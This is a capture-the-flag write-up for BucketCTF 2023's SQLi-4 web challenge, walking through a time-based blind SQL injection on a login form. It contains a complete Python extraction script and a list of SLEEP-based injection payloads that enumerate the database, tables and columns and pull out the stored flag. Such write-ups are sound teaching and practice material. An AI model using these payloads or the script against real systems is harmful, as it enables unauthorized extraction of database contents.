# SQLi-4 (BucketCTF 2023)

**Challenge category**: Web<br>
**Challenge description**: "This time I wont even give you the answer."<br>
**Challenge points**: 390<br>
**CTF date**: ven, 07 Apr. 2023, 17:00 UTC — dom, 09 Apr. 2023, 17:00 UTC<br>

## Context

This challenge is about a time-based blind SQL injection.

## Exploring the challenge

The web site consists of only one web page.

![Schermata_Iniziale](https://user-images.githubusercontent.com/66698256/230928472-417b4038-0a3a-4567-b48c-49905881df71.png)

The data entered in this form are sent to the <code>/login</code> endpoint.

![Form](https://user-images.githubusercontent.com/66698256/230928440-1ed31c33-9d31-4fbd-86cb-12a93c358357.png)


## Attack

We have to inject malicious data inside *Username* field (*Password* field is useless, can bet set to any value). As in the third challenge ([[1]](#1)) queries outputs are not shown. This time we can't even know if the query was successful or not. For example:

![Success_Injection](https://user-images.githubusercontent.com/66698256/230936909-ea3d5bd8-4dfa-46d0-b16e-326d824598a1.png)

![Success](https://user-images.githubusercontent.com/66698256/230936955-b4b4f32a-9f2f-49df-b5be-ed34590374a6.png)

![Failure_Injection](https://user-images.githubusercontent.com/66698256/230936994-7e319254-874a-486a-b5c9-a12bba5a6563.png)

![Failure](https://user-images.githubusercontent.com/66698256/230937027-3534267a-aa77-4822-bcc6-834591bd5bdf.png)

Thus, the server returns nothing useful. Despite that, we can rebuild the part of the database of our interest and extrapolate the flag. How? Thanks to a time-based approach, where we'll have to inject inputs like <code>' OR 1=(IF CONDITION, SLEEP(n), 1)#</code>. If <code>CONDITION</code> is true, the query executed by the server will take longer than necessary to complete (because it causes the DBMS to remain idle for *n* seconds), and therefore the response will be delayed. If <code>CONDITION</code> is false, server response will be returned immediately. By defining a timeout interval (smaller than *n*, but not too much) on the requests, we could identify the inputs that caused the corresponding response to be delayed and then deduce which condition turned out to be true, effectively extrapolating important information on the database content. Let's start.<br>

The piece of code below is to know the length of the database name and the database name. It's not a foundamental step and can be omitted (because we'll use the <code>database()</code> function in the next steps).

```python
import requests
import time



urlname="http://213.133.103.186:7005/login" #http://CONTAINER_IP:CONTAINER_PORT/login

chars=["{","}","\_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","!"]#,">","<",":",";","!","@","_","-","+","?","$","#","&","=","*"]
#The underscore character ("_") is represented as "\_" because it is a wildcard in the SQL LIKE operator, so the square brackets are useful to make SQL interpret it literally.

len_db_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(database()))="+str(len_db_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_db_name=len_db_name+1
print ("[Found]The length of the database name is: "+str(len_db_name))

i=0
db_name=""
while i<len_db_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT database()) LIKE '"+str(db_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            db_name+=name_char
            break
    i=i+1
print ("[Found]The database name is: "+db_name)
```
Let's run it:

![Len_DB_Name](https://user-images.githubusercontent.com/66698256/230970446-d86af4d3-af8d-4330-b91b-74c268fede23.png)

![DB_Name](https://user-images.githubusercontent.com/66698256/230970460-bb668c33-fc4e-4592-97d1-0a9fdc7f7c69.png)


Now we'll find out the number of tables inside the database. So, we'll add the following code to the one above:

```python
tables_count=0
while True:
    sql_injection="' OR 1=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())="+str(tables_count)+", SLEEP(5), 1)#"
    print ("[+]Try: "+sql_injection)
    try:
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
    except:
        break
    tables_count=tables_count+1
print ("[Found]The number of tables inside the database is: "+str(tables_count))
```
Let's run it:

![Num_Tables](https://user-images.githubusercontent.com/66698256/230970512-450ff0eb-d6ae-4e19-b259-62341338cb3b.png)


There are two tables. Now we'll find the length of the first table name and the first table name (because the flag is in the first table). Let's add the following code to the ones above:
```python
len_table1_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)="+str(len_table1_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_table1_name=len_table1_name+1
print ("[Found]The length of the first table name is: "+str(len_table1_name))

i=0
table1_name=""
while i<len_table1_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '"+str(table1_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            table1_name+=name_char
            break
    i=i+1
print ("[Found]The first table name is: "+table1_name) #The first table is 'Flags'!
```
Let's run it:

![Flag_Len_Name_Table](https://user-images.githubusercontent.com/66698256/230970548-b1a7dba8-344e-49e6-b638-26c75e2ecd8b.png)

![Flag_Name_Table](https://user-images.githubusercontent.com/66698256/230970572-fdb28df6-47bd-48aa-854b-7990dbd17a00.png)


The first table name is "Flags". Now we'll find out the number of columns inside "Flags" table. Let's add the following code to the ones above:
```python
table1_columns_count=1
while True:
        sql_injection="' OR 1=IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"')="+str(table1_columns_count)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        table1_columns_count=table1_columns_count+1
print ("[Found]The number of columns in the '"+table1_name+"' table is: "+str(table1_columns_count))
```
Let's run it:

![Num_Columns](https://user-images.githubusercontent.com/66698256/230971008-7dfaca68-9ae4-4d77-91ec-1f273bb6c49f.png)


There are two columns. Now we'll find the length of the second column name and second column name (because the flag is in the second column). Let's add the following code to the ones above:
```python
len_column2_name=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1)="+str(len_column2_name)+", SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)    #Random Password
        except:
            break
        len_column2_name=len_column2_name+1
print ("[Found]The length of the second column name of the '"+table1_name+"' table is: "+str(len_column2_name))

i=0
column2_name=""
while i<len_column2_name:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1) LIKE '"+str(column2_name+name_char)+"%', SLEEP(5), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=3)  #Random Password
        except:
            column2_name+=name_char
            break
    i=i+1
print ("[Found]The name of the second column of the '"+table1_name+"' table is: "+column2_name) #Column's name: 'value'
```

Let's run it:

![Len_SecCol_Name](https://user-images.githubusercontent.com/66698256/230970635-a257a711-d7f0-46da-93ff-c40a3f7018f1.png)

![SecCol_Name](https://user-images.githubusercontent.com/66698256/230970646-873ddc78-2ab1-47af-9ff4-c8a6f0159d29.png)


The second column name is "value". Now let's find the flag length and the flag itself. Let's add the following code to the ones above:
```python
len_flag=1
while True:
        sql_injection="' OR 1=IF((SELECT LENGTH("+column2_name+") FROM "+table1_name+" LIMIT 0,1)="+str(len_flag)+", SLEEP(10), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=5)    #Random Password
        except:
            break
        len_flag=len_flag+1
print ("[Found]The length of the flag is: "+str(len_flag))

i=0
flag_name=""
flag=""
while i<len_flag:
    for name_char in chars:
        sql_injection="' OR 1=IF((SELECT "+column2_name+" FROM "+table1_name+" LIMIT 0,1) LIKE '"+str(flag_name+name_char)+"%', SLEEP(12), 1)#"
        print ("[+]Try: "+sql_injection)
        try:
            response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'},timeout=10)  #Random Password
        except:
            flag_name+=name_char
            break
    i=i+1

flag=flag_name.replace("\_","_")
print ("[Found]The flag is: "+flag) #Flag
```
During the discovery of each character of the flag I encountered some difficulties because some requests were processed more slowly than usual and therefore some discovered characters were wrong (I don't know why this problem didn't happen to me in other phases of the attack as well). Therefore, I decided to increase the requests' timeout interval and the number of seconds specified inside the sleep() function.

Let's run it (this part may take a few minutes to complete and find the flag):

![Len_Flag](https://user-images.githubusercontent.com/66698256/230970687-e7b4208c-7ed2-44b6-9087-ba44e18ba4b7.png)

![Flag](https://user-images.githubusercontent.com/66698256/230970709-d09586c9-32b0-4675-be9f-27c26b19e474.png)

(If sometimes the exploit doesn't work I recommend you to adjust some time parameters, since its functioning also depends on the type of network connection you have)

Flag is <code>bucket{h4d35t_sql1_2b05bc}</code>.

## Payloads

These payloads should be used in loops with different values.

+ <code>' OR 1=IF((SELECT LENGTH(database()))=numeric_value, SLEEP(5), 1)#</code> for the length of the database name<br>
+ <code>' OR 1=IF((SELECT database()) LIKE 'substring%', SLEEP(5), 1)#</code> for database name<br>
+ <code>' OR 1=IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=numeric_value, SLEEP(5), 1)#</code> for the tables count in the database<br>
+ <code>' OR 1=IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the first table name<br>
+ <code>' OR 1=IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the first table name<br>
+ <code>' OR 1=IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name')=numeric_value, SLEEP(5), 1)#</code> for the columns count in the first table<br>
+ <code>' OR 1=IF((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1)=numeric_value, SLEEP(5), 1)#</code> for the length of the second column name of the first table<br>
+ <code>' OR 1=IF((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1) LIKE 'substring%', SLEEP(5), 1)#</code> for the second column name of the first table<br>
+ <code>' OR 1=IF((SELECT LENGTH(secondo_column_name) FROM first_table_name LIMIT 0,1)=numeric_value, SLEEP(10), 1)#</code> for the length of the flag<br>
+ <code>' OR 1=IF((SELECT second_column_name FROM first_table_name LIMIT 0,1) LIKE 'substring%', SLEEP(12), 1)#</code> for the flag<br>

## References
<a id="1">[1]</a> 
https://github.com/H31s3n-b3rg/BucketCTF_2023/blob/main/SQLi/SQLi-3/README.md
